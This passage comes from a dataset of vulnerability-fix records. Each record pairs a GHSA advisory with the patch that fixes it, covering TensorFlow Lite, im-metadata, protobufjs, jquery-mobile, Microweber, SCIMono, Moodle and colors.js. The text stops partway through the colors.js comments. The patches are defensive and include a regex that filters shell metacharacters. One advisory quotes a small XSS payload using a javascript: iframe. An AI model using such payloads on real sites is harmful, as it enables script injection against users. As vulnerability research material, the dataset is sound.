      "files": "{'tensorflow/lite/kernels/fully_connected.cc': {'additions': 48, 'deletions': 10, 'changes': 58, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/6c0b2b70eeee588591680f5b7d5d38175fd7cdf6/tensorflow%2Flite%2Fkernels%2Ffully_connected.cc', 'patch': '@@ -928,6 +928,36 @@ TfLiteStatus EvalShuffledQuantized(TfLiteContext* context, TfLiteNode* node,\\n   return kTfLiteOk;\\n }\\n \\n+// Verifies that sparsity values are valid given input/weight/output.\\n+bool VerifySparsity(const RuntimeShape& weights_shape,\\n+                    const RuntimeShape& input_shape,\\n+                    const RuntimeShape& output_shape,\\n+                    const TfLiteSparsity* sparsity) {\\n+  const int weights_dims_count = weights_shape.DimensionsCount();\\n+  const int output_dims_count = output_shape.DimensionsCount();\\n+  const int w0_size = sparsity->dim_metadata[0].dense_size;\\n+  const int accum_depth = weights_shape.Dims(weights_dims_count - 1);\\n+  const int output_elements = output_shape.FlatSize();\\n+  const int input_elements = input_shape.FlatSize();\\n+  const int batches = FlatSizeSkipDim(output_shape, output_dims_count - 1);\\n+  const int output_depth = MatchingDim(weights_shape, weights_dims_count - 2,\\n+                                       output_shape, output_dims_count - 1);\\n+  const int max_batch_index = batches - 1;\\n+  const int max_output = max_batch_index * output_depth + w0_size;\\n+  const int max_batch_depth = accum_depth * max_batch_index;\\n+\\n+  // Verify output size is enough.\\n+  if (output_elements < max_output) return false;\\n+\\n+  // Verify index from sparse in input is valid.\\n+  for (int i = 0; i < sparsity->dim_metadata[1].array_indices->size; ++i) {\\n+    if (input_elements <=\\n+        max_batch_depth + sparsity->dim_metadata[1].array_indices->data[i])\\n+      return false;\\n+  }\\n+  return true;\\n+}\\n+\\n template <KernelType kernel_type>\\n TfLiteStatus EvalFloat(TfLiteContext* context, TfLiteNode* node,\\n                        TfLiteFullyConnectedParams* params, OpData* data,\\n@@ -968,24 +998,32 @@ TfLiteStatus EvalFloat(TfLiteContext* context, TfLiteNode* node,\\n                            \"Unsupported sparse fully-connected weight format.\");\\n         return kTfLiteError;\\n       }\\n+      const auto& input_shape = GetTensorShape(input);\\n+      const auto& filter_shape = GetTensorShape(filter);\\n+      const auto& output_shape = GetTensorShape(output);\\n+      const auto& bias_shape = GetTensorShape(bias);\\n+      if (!VerifySparsity(filter_shape, input_shape, output_shape, &sparsity)) {\\n+        TF_LITE_KERNEL_LOG(context, \"Invalid sparse fully-connected format.\");\\n+        return kTfLiteError;\\n+      }\\n \\n       if (sparsity.dim_metadata_size == kDimMetadataSizeRandomSparse) {\\n         // Random sparse.\\n         optimized_ops::FullyConnectedSparseWeight(\\n-            sparsity, op_params, GetTensorShape(input),\\n-            GetTensorData<float>(input), GetTensorShape(filter),\\n-            GetTensorData<float>(filter), GetTensorShape(bias),\\n-            GetTensorData<float>(bias), GetTensorShape(output),\\n-            GetTensorData<float>(output));\\n+            sparsity, op_params,                         // Disable formatting\\n+            input_shape, GetTensorData<float>(input),    // Disable formatting\\n+            filter_shape, GetTensorData<float>(filter),  // Disable formatting\\n+            bias_shape, GetTensorData<float>(bias),      // Disable formatting\\n+            output_shape, GetTensorData<float>(output));\\n       } else if (sparsity.dim_metadata_size == kDimMetadataSizeBlockSparse &&\\n                  sparsity.dim_metadata[2].dense_size == 4) {\\n         // Block sparse with block size of 1x4.\\n         optimized_ops::FullyConnectedSparseWeight1x4(\\n-            sparsity, op_params, GetTensorShape(input),\\n-            GetTensorData<float>(input), GetTensorShape(filter),\\n-            GetTensorData<float>(filter), GetTensorShape(bias),\\n-            GetTensorData<float>(bias), GetTensorShape(output),\\n-            GetTensorData<float>(output),\\n+            sparsity, op_params,                         // Disable formatting\\n+            input_shape, GetTensorData<float>(input),    // Disable formatting\\n+            filter_shape, GetTensorData<float>(filter),  // Disable formatting\\n+            bias_shape, GetTensorData<float>(bias),      // Disable formatting\\n+            output_shape, GetTensorData<float>(output),\\n             CpuBackendContext::GetFromContext(context));\\n       } else {\\n         TF_LITE_KERNEL_LOG(context,'}}",
      "message_norm": "[lite] add validation check for sparse fully connected\n\npiperorigin-revid: 417629354\nchange-id: if96171c4bd4f5fdb01d6368d6deab19d1c9beca7",
      "language": "en",
      "entities": "[('add', 'ACTION', ''), ('417629354', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/lite/kernels/fully_connected.cc'])",
      "num_files": 1.0
    },
    {
      "index": 2747,
      "vuln_id": "GHSA-qfxv-qqvg-24pg",
      "cwe_id": "{'CWE-78'}",
      "score": 9.8,
      "chain": "{'https://github.com/Turistforeningen/node-im-metadata/commit/ea15dddbe0f65694bfde36b78dd488e90f246639'}",
      "dataset": "osv",
      "summary": "OS Command Injection in im-metadata im-metadata through 3.0.1 allows remote attackers to execute arbitrary commands via the \"exec\" argument. It is possible to inject arbitrary commands as part of the metadata options which is given to the \"exec\" function.",
      "published_date": "2021-04-13",
      "chain_len": 1,
      "project": "https://github.com/Turistforeningen/node-im-metadata",
      "commit_href": "https://github.com/Turistforeningen/node-im-metadata/commit/ea15dddbe0f65694bfde36b78dd488e90f246639",
      "commit_sha": "ea15dddbe0f65694bfde36b78dd488e90f246639",
      "patch": "SINGLE",
      "chain_ord": "['ea15dddbe0f65694bfde36b78dd488e90f246639']",
      "before_first_fix_commit": "{'049ce24dbb4302811b9247444347da6561605a8a'}",
      "last_fix_commit": "ea15dddbe0f65694bfde36b78dd488e90f246639",
      "chain_ord_pos": 1.0,
      "commit_datetime": "02/03/2020, 21:26:09",
      "message": "fix: check path argument before processing (#10)\n\nhotfix to re mediate command injection",
      "author": "Sam Sanoop",
      "comments": null,
      "stats": "{'additions': 9, 'deletions': 6, 'total': 15}",
      "files": "{'index.js': {'additions': 9, 'deletions': 6, 'changes': 15, 'status': 'modified', 'raw_url': 'https://github.com/Turistforeningen/node-im-metadata/raw/ea15dddbe0f65694bfde36b78dd488e90f246639/index.js', 'patch': \"@@ -9,15 +9,18 @@ module.exports = function(path, opts, cb) {\\n     opts = {};\\n   }\\n \\n-  var cmd = module.exports.cmd(path, opts);\\n-  opts.timeout = opts.timeout || 5000;\\n-\\n-  exec(cmd, opts, function(e, stdout, stderr) {\\n-    if (e) { return cb(e); }\\n+  if(/;|&|`|\\\\$|\\\\(|\\\\)|\\\\|\\\\||\\\\||!|>|<|\\\\?|\\\\${/g.test(JSON.stringify(path))) {\\n+    console.log('Input Validation failed, Suspicious Characters found');\\n+  } else {\\n+    var cmd = module.exports.cmd(path, opts);\\n+    opts.timeout = opts.timeout || 5000;\\n+    exec(cmd, opts, function(e, stdout, stderr) {\\n+      if (e) { return cb(e); }\\n     if (stderr) { return cb(new Error(stderr)); }\\n \\n-    return cb(null, module.exports.parse(path, stdout, opts));\\n+      return cb(null, module.exports.parse(path, stdout, opts));\\n   });\\n+}\\n };\\n \\n module.exports.cmd = function(path, opts) {\"}}",
      "message_norm": "fix: check path argument before processing (#10)\n\nhotfix to re mediate command injection",
      "language": "en",
      "entities": "[('#10', 'ISSUE', ''), ('hotfix', 'ACTION', ''), ('command injection', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['index.js'])",
      "num_files": 1.0
    },
    {
      "index": 1852,
      "vuln_id": "GHSA-g954-5hwp-pp24",
      "cwe_id": "{'CWE-1321'}",
      "score": 7.5,
      "chain": "{'https://github.com/protobufjs/protobuf.js/commit/b5f1391dff5515894830a6570e6d73f5511b2e8f'}",
      "dataset": "osv",
      "summary": "Prototype Pollution in protobufjs The package protobufjs before 6.11.3 and 6.10.3 is vulnerable to Prototype Pollution, which can allow an attacker to add/modify properties of the Object.prototype.\n\nThis vulnerability can occur in multiple ways:\n1. by providing untrusted user input to util.setProperty or to ReflectionObject.setParsedOption functions\n2. by parsing/loading .proto files",
      "published_date": "2022-05-28",
      "chain_len": 1,
      "project": "https://github.com/protobufjs/protobuf.js",
      "commit_href": "https://github.com/protobufjs/protobuf.js/commit/b5f1391dff5515894830a6570e6d73f5511b2e8f",
      "commit_sha": "b5f1391dff5515894830a6570e6d73f5511b2e8f",
      "patch": "SINGLE",
      "chain_ord": "['b5f1391dff5515894830a6570e6d73f5511b2e8f']",
      "before_first_fix_commit": "{'7afd0a39f41d6df5fda6fa10c319cdf829027d3e'}",
      "last_fix_commit": "b5f1391dff5515894830a6570e6d73f5511b2e8f",
      "chain_ord_pos": 1.0,
      "commit_datetime": "05/20/2022, 18:08:37",
      "message": "fix: do not let setProperty change the prototype (#1731)",
      "author": "Alexander Fenster",
      "comments": null,
      "stats": "{'additions': 3, 'deletions': 0, 'total': 3}",
      "files": "{'src/util.js': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https://github.com/protobufjs/protobuf.js/raw/b5f1391dff5515894830a6570e6d73f5511b2e8f/src%2Futil.js', 'patch': '@@ -176,6 +176,9 @@ util.decorateEnum = function decorateEnum(object) {\\n util.setProperty = function setProperty(dst, path, value) {\\n     function setProp(dst, path, value) {\\n         var part = path.shift();\\n+        if (part === \"__proto__\") {\\n+          return dst;\\n+        }\\n         if (path.length > 0) {\\n             dst[part] = setProp(dst[part] || {}, path, value);\\n         } else {'}}",
      "message_norm": "fix: do not let setproperty change the prototype (#1731)",
      "language": "en",
      "entities": "[('change', 'ACTION', ''), ('#1731', 'ISSUE', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['src/util.js'])",
      "num_files": 1.0
    },
    {
      "index": 1742,
      "vuln_id": "GHSA-fj93-7wm4-8x2g",
      "cwe_id": "{'CWE-79'}",
      "score": 0.0,
      "chain": "{'https://github.com/jquery/jquery-mobile/commit/b0d9cc758a48f13321750d7409fb7655dcdf2b50'}",
      "dataset": "osv",
      "summary": "Cross-Site Scripting in jquery-mobile All version of `jquery-mobile` are vulnerable to Cross-Site Scripting. The package checks for content in `location.hash` and if a URL is found it does an XmlHttpRequest (XHR) to the URL and renders the response with `innerHTML`. It fails to validate the `Content-Type` of the response, allowing attackers to include malicious payloads as part of query parameters that are reflected back to the user. A response such as `{\"q\":\"<iframe/src='javascript:alert(1)'></iframe>\",\"results\":[]}` would be parsed as HTML and the JavaScript payload executed.\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative package until a fix is made available.",
      "published_date": "2020-09-02",
      "chain_len": 1,
      "project": "https://github.com/jquery/jquery-mobile",
      "commit_href": "https://github.com/jquery/jquery-mobile/commit/b0d9cc758a48f13321750d7409fb7655dcdf2b50",
      "commit_sha": "b0d9cc758a48f13321750d7409fb7655dcdf2b50",
      "patch": "SINGLE",
      "chain_ord": "['b0d9cc758a48f13321750d7409fb7655dcdf2b50']",
      "before_first_fix_commit": "{'1f0cec9bcb9d75998e733d580d6f1144c963326e'}",
      "last_fix_commit": "b0d9cc758a48f13321750d7409fb7655dcdf2b50",
      "chain_ord_pos": 1.0,
      "commit_datetime": "06/13/2019, 17:42:26",
      "message": "Check Content-Type header before parsing AJAX response as HTML (#8649)\n\nFix for issue #8640 (possible XSS vulnerability)",
      "author": "Denis Ryabov",
      "comments": null,
      "stats": "{'additions': 9, 'deletions': 0, 'total': 9}",
      "files": "{'js/widgets/pagecontainer.js': {'additions': 9, 'deletions': 0, 'changes': 9, 'status': 'modified', 'raw_url': 'https://github.com/jquery-archive/jquery-mobile/raw/b0d9cc758a48f13321750d7409fb7655dcdf2b50/js%2Fwidgets%2Fpagecontainer.js', 'patch': '@@ -564,6 +564,15 @@ $.widget( \"mobile.pagecontainer\", {\\n \\n \\t\\treturn $.proxy( function( html, textStatus, xhr ) {\\n \\n+\\t\\t\\t// Check that Content-Type is \"text/html\" (https://github.com/jquery/jquery-mobile/issues/8640)\\n+\\t\\t\\tif ( !/^text\\\\/html\\\\b/.test( xhr.getResponseHeader(\\'Content-Type\\') ) ) {\\n+\\t\\t\\t\\t// Display error message for unsupported content type\\n+\\t\\t\\t\\tif ( settings.showLoadMsg ) {\\n+\\t\\t\\t\\t\\tthis._showError();\\n+\\t\\t\\t\\t}\\n+\\t\\t\\t\\treturn;\\n+\\t\\t\\t}\\n+\\n \\t\\t\\t// Pre-parse html to check for a data-url, use it as the new fileUrl, base path, etc\\n \\t\\t\\tvar content,'}}",
      "message_norm": "check content-type header before parsing ajax response as html (#8649)\n\nfix for issue #8640 (possible xss vulnerability)",
      "language": "en",
      "entities": "[('#8649', 'ISSUE', ''), ('issue', 'FLAW', ''), ('#8640', 'ISSUE', ''), ('xss', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['js/widgets/pagecontainer.js'])",
      "num_files": 1.0
    },
    {
      "index": 1465,
      "vuln_id": "GHSA-c383-q5vf-hx55",
      "cwe_id": "{'CWE-190'}",
      "score": 7.5,
      "chain": "{'https://github.com/microweber/microweber/commit/7559e141d0707f8eeff2f9aeaa5a0ca2e3fe6583'}",
      "dataset": "osv",
      "summary": "Integer Overflow or Wraparound in Microweber Microweber prior to 1.2.12 is vulnerable to Integer Overflow or Wraparound.",
      "published_date": "2022-03-12",
      "chain_len": 1,
      "project": "https://github.com/microweber/microweber",
      "commit_href": "https://github.com/microweber/microweber/commit/7559e141d0707f8eeff2f9aeaa5a0ca2e3fe6583",
      "commit_sha": "7559e141d0707f8eeff2f9aeaa5a0ca2e3fe6583",
      "patch": "SINGLE",
      "chain_ord": "['7559e141d0707f8eeff2f9aeaa5a0ca2e3fe6583']",
      "before_first_fix_commit": "{'28f2677ea228a36e7692505e1821ae373a8b07e4'}",
      "last_fix_commit": "7559e141d0707f8eeff2f9aeaa5a0ca2e3fe6583",
      "chain_ord_pos": 1.0,
      "commit_datetime": "03/11/2022, 08:30:42",
      "message": "checkout shipping address validation - max chars allowed",
      "author": "Bozhidar Slaveykov",
      "comments": null,
      "stats": "{'additions': 21, 'deletions': 4, 'total': 25}",
      "files": "{'src/MicroweberPackages/Checkout/Http/Controllers/Traits/ShippingTrait.php': {'additions': 21, 'deletions': 4, 'changes': 25, 'status': 'modified', 'raw_url': 'https://github.com/microweber/microweber/raw/7559e141d0707f8eeff2f9aeaa5a0ca2e3fe6583/src%2FMicroweberPackages%2FCheckout%2FHttp%2FControllers%2FTraits%2FShippingTrait.php', 'patch': \"@@ -38,13 +38,30 @@ public function shippingMethodSave(Request $request) {\\n \\n         if (is_array($request->get('Address'))) {\\n             $request->merge([\\n-               'city'=>$request->get('Address')['city'],\\n-               'zip'=>$request->get('Address')['zip'],\\n-               'state'=>$request->get('Address')['state'],\\n-               'address'=>$request->get('Address')['address'],\\n+                'city'=>$request->get('Address')['city'],\\n+                'zip'=>$request->get('Address')['zip'],\\n+                'state'=>$request->get('Address')['state'],\\n+                'address'=>$request->get('Address')['address'],\\n             ]);\\n         }\\n \\n+        $rules = [];\\n+        $rules['shipping_gw'] = 'max:500';\\n+        $rules['city'] = 'max:500';\\n+        $rules['address'] = 'max:500';\\n+        $rules['country'] = 'max:500';\\n+        $rules['state'] = 'max:500';\\n+        $rules['zip'] = 'max:500';\\n+        $rules['other_info'] = 'max:500';\\n+\\n+        $validator = Validator::make($request->all(), $rules);\\n+\\n+        if ($validator->fails()) {\\n+            $errors = $validator->messages()->toArray();\\n+            session_set('errors', $errors);\\n+            return redirect(route('checkout.shipping_method'));\\n+        }\\n+\\n         session_append_array('checkout_v2', [\\n             'shipping_gw'=> $request->get('shipping_gw'),\\n             'city'=> $request->get('city'),\"}}",
      "message_norm": "checkout shipping address validation - max chars allowed",
      "language": "en",
      "entities": null,
      "classification_level_1": "NON_SECURITY_RELATED",
      "classification_level_2": "REDUNDANT_MESSAGE",
      "list_files": "dict_keys(['src/MicroweberPackages/Checkout/Http/Controllers/Traits/ShippingTrait.php'])",
      "num_files": 1.0
    },
    {
      "index": 73,
      "vuln_id": "GHSA-29q4-gxjq-rx5c",
      "cwe_id": "{'CWE-59', 'CWE-690', 'CWE-917', 'CWE-74', 'CWE-62', 'CWE-77'}",
      "score": 0.0,
      "chain": "{'https://github.com/SAP/scimono/commit/413b5d75fa94e77876af0e47be76475a23745b80'}",
      "dataset": "osv",
      "summary": "Remote Code Execution in SCIMono ### Impact\nIt is possible for attacker to inject and execute java expression and compromising the availability and integrity of the system.\n\n### Patches\nThe issue was fixed on  [0.0.19 version](https://mvnrepository.com/artifact/com.sap.scimono/scimono-server/0.0.19)",
      "published_date": "2021-02-10",
      "chain_len": 1,
      "project": "https://github.com/SAP/scimono",
      "commit_href": "https://github.com/SAP/scimono/commit/413b5d75fa94e77876af0e47be76475a23745b80",
      "commit_sha": "413b5d75fa94e77876af0e47be76475a23745b80",
      "patch": "SINGLE",
      "chain_ord": "['413b5d75fa94e77876af0e47be76475a23745b80']",
      "before_first_fix_commit": "{'8a09b8cfbb4cb797efac745c7ec3924569513844'}",
      "last_fix_commit": "413b5d75fa94e77876af0e47be76475a23745b80",
      "chain_ord_pos": 1.0,
      "commit_datetime": "11/30/2020, 14:35:19",
      "message": "Escape Java EL in validation message before interpolation (#117)",
      "author": "Aleydin Karaimin",
      "comments": null,
      "stats": "{'additions': 8, 'deletions': 1, 'total': 9}",
      "files": "{'scimono-server/src/main/java/com/sap/scimono/entity/schema/validation/ValidationUtil.java': {'additions': 8, 'deletions': 1, 'changes': 9, 'status': 'modified', 'raw_url': 'https://github.com/SAP/scimono/raw/413b5d75fa94e77876af0e47be76475a23745b80/scimono-server%2Fsrc%2Fmain%2Fjava%2Fcom%2Fsap%2Fscimono%2Fentity%2Fschema%2Fvalidation%2FValidationUtil.java', 'patch': '@@ -1,13 +1,20 @@\\n \\n package com.sap.scimono.entity.schema.validation;\\n \\n+import java.util.regex.Pattern;\\n+\\n import javax.validation.ConstraintValidatorContext;\\n \\n class ValidationUtil {\\n+  private static final Pattern EXPRESSION_LANGUAGE_CHARACTERS = Pattern.compile(\"([${}])\");\\n \\n   public static void interpolateErrorMessage(ConstraintValidatorContext context, String errorMessage) {\\n     context.disableDefaultConstraintViolation();\\n-    context.buildConstraintViolationWithTemplate(errorMessage).addConstraintViolation();\\n+    context.buildConstraintViolationWithTemplate(escapeExpressionLanguage(errorMessage)).addConstraintViolation();\\n+  }\\n+\\n+  private static String escapeExpressionLanguage(String text) {\\n+    return EXPRESSION_LANGUAGE_CHARACTERS.matcher(text).replaceAll( \"\\\\\\\\\\\\\\\\$1\" );\\n   }\\n \\n }'}}",
      "message_norm": "escape java el in validation message before interpolation (#117)",
      "language": "it",
      "entities": "[('escape', 'SECWORD', ''), ('#117', 'ISSUE', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['scimono-server/src/main/java/com/sap/scimono/entity/schema/validation/ValidationUtil.java'])",
      "num_files": 1.0
    },
    {
      "index": 1964,
      "vuln_id": "GHSA-h2fw-93qx-vrcq",
      "cwe_id": "{'CWE-89'}",
      "score": 8.8,
      "chain": "{'https://github.com/moodle/moodle/commit/c2794752ea3cdda2d64a0651da08b2cdf730d9f1'}",
      "dataset": "osv",
      "summary": "SQL Injection in Moodle An SQL injection risk was identified in Badges code relating to configuring criteria. Access to the relevant capability was limited to teachers and managers by default.",
      "published_date": "2022-03-26",
      "chain_len": 1,
      "project": "https://github.com/moodle/moodle",
      "commit_href": "https://github.com/moodle/moodle/commit/c2794752ea3cdda2d64a0651da08b2cdf730d9f1",
      "commit_sha": "c2794752ea3cdda2d64a0651da08b2cdf730d9f1",
      "patch": "SINGLE",
      "chain_ord": "['c2794752ea3cdda2d64a0651da08b2cdf730d9f1']",
      "before_first_fix_commit": "{'addd4f894d8173ec8ff0ae2212d51a1977e7bcad'}",
      "last_fix_commit": "c2794752ea3cdda2d64a0651da08b2cdf730d9f1",
      "chain_ord_pos": 1.0,
      "commit_datetime": "03/03/2022, 18:02:15",
      "message": "MDL-74074 badges: Ensure profile criteria exists before completion check",
      "author": "Michael Hawkins",
      "comments": null,
      "stats": "{'additions': 23, 'deletions': 6, 'total': 29}",
      "files": "{'badges/criteria/award_criteria_profile.php': {'additions': 23, 'deletions': 6, 'changes': 29, 'status': 'modified', 'raw_url': 'https://github.com/moodle/moodle/raw/c2794752ea3cdda2d64a0651da08b2cdf730d9f1/badges%2Fcriteria%2Faward_criteria_profile.php', 'patch': '@@ -39,6 +39,26 @@ class award_criteria_profile extends award_criteria {\\n     public $required_param = \\'field\\';\\n     public $optional_params = array();\\n \\n+    /* @var array The default profile fields allowed to be used as award criteria.\\n+     *\\n+     * Note: This is used instead of user_get_default_fields(), because it is not possible to\\n+     * determine which fields the user can modify.\\n+     */\\n+    protected $allowed_default_fields = [\\n+        \\'firstname\\',\\n+        \\'lastname\\',\\n+        \\'email\\',\\n+        \\'address\\',\\n+        \\'phone1\\',\\n+        \\'phone2\\',\\n+        \\'department\\',\\n+        \\'institution\\',\\n+        \\'description\\',\\n+        \\'picture\\',\\n+        \\'city\\',\\n+        \\'country\\',\\n+    ];\\n+\\n     /**\\n      * Add appropriate new criteria options to the form\\n      *\\n@@ -50,10 +70,7 @@ public function get_options(&$mform) {\\n         $none = true;\\n         $existing = array();\\n         $missing = array();\\n-\\n-        // Note: cannot use user_get_default_fields() here because it is not possible to decide which fields user can modify.\\n-        $dfields = array(\\'firstname\\', \\'lastname\\', \\'email\\', \\'address\\', \\'phone1\\', \\'phone2\\',\\n-                         \\'department\\', \\'institution\\', \\'description\\', \\'picture\\', \\'city\\', \\'country\\');\\n+        $dfields = $this->allowed_default_fields;\\n \\n         // Get custom fields.\\n         $cfields = array_filter(profile_get_custom_fields(), function($field) {\\n@@ -230,8 +247,8 @@ public function get_completed_criteria_sql() {\\n                 $join .= \" LEFT JOIN {user_info_data} uid{$idx} ON uid{$idx}.userid = u.id AND uid{$idx}.fieldid = :fieldid{$idx} \";\\n                 $params[\"fieldid{$idx}\"] = $param[\\'field\\'];\\n                 $whereparts[] = \"uid{$idx}.id IS NOT NULL\";\\n-            } else {\\n-                // This is a field from {user} table.\\n+            } else if (in_array($param[\\'field\\'], $this->allowed_default_fields)) {\\n+                // This is a valid field from {user} table.\\n                 if ($param[\\'field\\'] == \\'picture\\') {\\n                     // The picture field is numeric and requires special handling.\\n                     $whereparts[] = \"u.{$param[\\'field\\']} != 0\";'}}",
      "message_norm": "mdl-74074 badges: ensure profile criteria exists before completion check",
      "language": "en",
      "entities": "[('ensure', 'ACTION', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['badges/criteria/award_criteria_profile.php'])",
      "num_files": 1.0
    },
    {
      "index": 693,
      "vuln_id": "GHSA-5rqg-jm4f-cqx7",
      "cwe_id": "{'CWE-835'}",
      "score": 0.0,
      "chain": "{'https://github.com/Marak/colors.js/commit/5d2d242f656103ac38086d6b26433a09f1c38c75', 'https://github.com/Marak/colors.js/commit/137c6dae3339e97f4bbc838c221803c363b0a9fd', 'https://github.com/Marak/colors.js/commit/6bc50e79eeaa1d87369bb3e7e608ebed18c5cf26'}",
      "dataset": "osv",
      "summary": "Infinite loop causing Denial of Service in colors colors is a library for including colored text in node.js consoles. Between 07 and 09 January 2022, colors versions 1.4.1, 1.4.2, and 1.4.44-liberty-2 were published including malicious code that caused a Denial of Service due to an infinite loop. Software dependent on these versions experienced the printing of randomized characters to console and an infinite loop resulting in unbound system resource consumption.\n\nUsers of colors relying on these specific versions should downgrade to version 1.4.0.",
      "published_date": "2022-01-10",
      "chain_len": 3,
      "project": "https://github.com/Marak/colors.js",
      "commit_href": "https://github.com/Marak/colors.js/commit/5d2d242f656103ac38086d6b26433a09f1c38c75",
      "commit_sha": "5d2d242f656103ac38086d6b26433a09f1c38c75",
      "patch": "MULTI",
      "chain_ord": "['137c6dae3339e97f4bbc838c221803c363b0a9fd', '5d2d242f656103ac38086d6b26433a09f1c38c75', '6bc50e79eeaa1d87369bb3e7e608ebed18c5cf26']",
      "before_first_fix_commit": "{'5d2d242f656103ac38086d6b26433a09f1c38c75'}",
      "last_fix_commit": "6bc50e79eeaa1d87369bb3e7e608ebed18c5cf26",
      "chain_ord_pos": 2.0,
      "commit_datetime": "01/08/2022, 04:21:02",
      "message": "Fix bug",
      "author": "Marak",
      "comments": "{'com_1': {'author': 'bacloud22', 'datetime': '01/08/2022, 07:00:53', 'body': 'oops, now it works \ud83e\udd23'}, 'com_2': {'author': 'AuroPick', 'datetime': '01/10/2022, 01:19:13', 'body': 'delete this shit'}, 'com_3': {'author': 'KeZengOo', 'datetime': '01/10/2022, 02:21:07', 'body': 'Amazing\uff01'}, 'com_4': {'author': 'summic', 'datetime': '01/10/2022, 02:48:32', 'body': 'Disgusting!'}, 'com_5': {'author': 'zhang354455288', 'datetime': '01/10/2022, 06:50:25', 'body': 'niubi laotie'}, 'com_6': {'author': 'yyg1219', 'datetime': '01/10/2022, 07:10:16', 'body': 'niua niua'}, 'com_7': {'author': 'zhangwenwen12138', 'datetime': '01/10/2022, 08:10:05', 'body': '\u94c1\u5b50\uff0c\u4f60\u600e\u4e48\u4e86'}, 'com_8': {'author': 'vaecebyZ', 'datetime': '01/10/2022, 09:31:36', 'body': \"While we sympathize with you, you're doing a disservice to other developers.\ud83d\ude28\"}, 'com_9': {'author': 'chen-fac', 'datetime': '01/10/2022, 09:37:07', 'body': '\u524d\u6392\u51fa\u552e\u82b1\u751f\u74dc\u5b50'}, 'com_10': {'author': 'DragonCat1', 'datetime': '01/10/2022, 09:52:22', 'body': '\u5e7f\u544a\u4f4d\u62db\u79df'}, 'com_11': {'author': 'evanchen0629', 'datetime': '01/10/2022, 09:53:53', 'body': '\u524d\u9762\u7684\u540c\u5fd7\u628a\u811a\u6536\u4e00\u6536'}, 'com_12': {'author': 'wokalek', 'datetime': '01/10/2022, 09:58:35', 'body': 'Starege'}, 'com_13': {'author': 'brolnickij', 'datetime': '01/10/2022, 10:17:54', 'body': 'nice trolling :D'}, 'com_14': {'author': 'withsalt', 'datetime': '01/10/2022, 10:26:09', 'body': 'nice code!'}, 'com_15': {'author': 'Ansen', 'datetime': '01/10/2022, 10:29:24', 'body': 'six six six'}, 'com_16': {'author': 'SheltonZhu', 'datetime': '01/10/2022, 10:39:39', 'body': 'brilliant !!!!!'}, 'com_17': {'author': 'mxj1337', 'datetime': '01/10/2022, 11:00:51', 'body': 'LIKE'}, 'com_18': {'author': 'WeirdConstructor', 'datetime': '01/10/2022, 12:33:35', 'body': 'Obviously this bugfix is missing a regression test! ;-)'}, 'com_19': {'author': 'wuzhidexiaolang', 'datetime': '01/10/2022, 14:28:13', 'body': 'nice'}, 'com_20': {'author': 'manudevcode', 'datetime': '01/10/2022, 16:02:59', 'body': \"Lol, when your intentional error, doesn't work xD\"}, 'com_21': {'author': 'LuciusChen', 'datetime': '01/10/2022, 16:18:08', 'body': '\u725b\u903c\u554a'}, 'com_22': {'author': 'golangboy', 'datetime': '01/10/2022, 17:01:00', 'body': '\u524d\u7aef\u5708\u771f\u70ed\u95f9'}, 'com_23': {'author': 'prietales', 'datetime': '01/10/2022, 17:53:17', 'body': 'let am should be const.'}, 'com_24': {'author': 'xinx1n', 'datetime': '01/11/2022, 02:20:44', 'body': '\u82df\u5229\u56fd\u5bb6\u751f\u6b7b\u4ee5'}, 'com_25': {'author': 'paoqi1997', 'datetime': '01/11/2022, 02:20:59', 'body': '12, 3456'}, 'com_26': {'author': 'manudevcode', 'datetime': '01/11/2022, 03:31:54', 'body': '> 12, 3456\\r\\n\\r\\nLa tuya por si las dudas xD'}, 'com_27': {'author': '949nb', 'datetime': '01/11/2022, 06:47:08', 'body': 'nice code!'}, 'com_28': {'author': 'npljy', 'datetime': '01/11/2022, 08:20:14', 'body': \"If you want to make money from open source, then don't open source\"}, 'com_29': {'author': 'machinebitezz', 'datetime': '01/11/2022, 14:24:03', 'body': 'Power to you tbh'}, 'com_30': {'author': 'ethnh', 'datetime': '01/11/2022, 16:19:27', 'body': '\ud83d\udd34\ud83d\udfe0\ud83d\udfe1\ud83d\udfe2\ud83d\udd35\ud83d\udfe3\ud83d\udfe4\u26ab\u26aa nice colors'}, 'com_31': {'author': 'zhushiqiang', 'datetime': '01/12/2022, 01:47:25', 'body': '666'}, 'com_32': {'author': 'zhushiqiang', 'datetime': '01/12/2022, 13:39:52', 'body': '\u8fd9\u662f\u6765\u81eaQQ\u90ae\u7bb1\u7684\u5047\u671f\u81ea\u52a8\u56de\u590d\u90ae\u4ef6\u3002\\n\\xa0\\n\u60a8\u597d\uff0c\u6211\u6700\u8fd1\u6b63\u5728\u4f11\u5047\u4e2d\uff0c\u65e0\u6cd5\u4eb2\u81ea\u56de\u590d\u60a8\u7684\u90ae\u4ef6\u3002\u6211\u5c06\u5728\u5047\u671f\u7ed3\u675f\u540e\uff0c\u5c3d\u5feb\u7ed9\u60a8\u56de\u590d\u3002'}, 'com_33': {'author': 'joaodematejr', 'datetime': '01/13/2022, 02:30:37', 'body': '@brunoibias'}, 'com_34': {'author': 'Rusnura', 'datetime': '01/13/2022, 03:18:05', 'body': 'Hello World!'}, 'com_35': {'author': 'a6513375', 'datetime': '01/13/2022, 13:39:17', 'body': '> \\r\\n\\r\\n\u6211\u8d85'}, 'com_36': {'author': 'zbeanbean', 'datetime': '01/14/2022, 06:26:34', 'body': 'wondeful'}, 'com_37': {'author': 'PalmDevs', 'datetime': '01/19/2022, 09:58:13', 'body': 'Reject `let`, `const`. Return to `var`. \ud83d\ude0f'}, 'com_38': {'author': 'TechStudent10', 'datetime': '01/19/2022, 12:10:56', 'body': 'What bug are you fixing exactly?'}, 'com_39': {'author': 'frankhasen', 'datetime': '01/19/2022, 14:07:04', 'body': '> What bug are you fixing exactly?\\r\\n\\r\\nfixing capitalizm bro'}, 'com_40': {'author': 'TechStudent10', 'datetime': 